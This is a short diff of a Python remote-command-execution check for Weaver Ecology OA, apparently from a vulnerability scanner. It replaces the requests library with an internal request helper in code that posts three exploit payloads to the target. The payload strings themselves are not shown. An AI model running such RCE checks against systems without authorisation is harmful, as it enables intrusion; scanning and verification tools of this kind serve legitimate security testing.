@@ -7,8 +7,8 @@ description: 泛微-OA漏洞可执行任意命令
 
 import sys
 import urllib3
-import requests
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class Weaver_Ecology_Oa_Rce_BaseVerify:
     def __init__(self, url):
@@ -35,7 +35,7 @@ class Weaver_Ecology_Oa_Rce_BaseVerify:
             url= self.url + Url_Payload
             for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): 
                 try:
-                    http_response = requests.post(url, data = Data_payload, headers = self.headers, allow_redirects=False, verify = False)
+                    http_response = request.post(url, data = Data_payload, headers = self.headers)
                     #print http_response.status_code
                     if http_response.status_code == 200:
                         if ";</script>" not in (http_response.content):
